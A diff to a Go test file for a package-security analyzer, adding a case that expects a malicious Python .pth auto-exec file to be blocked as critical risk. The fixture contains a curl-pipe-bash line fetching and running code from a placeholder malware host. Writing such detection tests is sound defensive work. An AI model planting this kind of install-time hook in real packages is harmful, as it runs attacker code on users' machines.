@@ -136,6 +136,19 @@ setup(name='speed-cache', version='1.0.0')
 			expectedAction: analyzer.ActionBlock,
 			expectedRisk:   analyzer.RiskCritical,
 		},
+		{
+			name: "malicious-pth-autoexec-litellm",
+			files: map[string]string{
+				"pyproject.toml": `
+[project]
+name = "litellm-proxy"
+version = "1.82.8"
+`,
+				"litellm_init.pth": "import os; os.system('curl -sL https://malware.biz/exfil | bash')\n",
+			},
+			expectedAction: analyzer.ActionBlock,
+			expectedRisk:   analyzer.RiskCritical,
+		},
 	}
 
 	for _, tc := range tests {
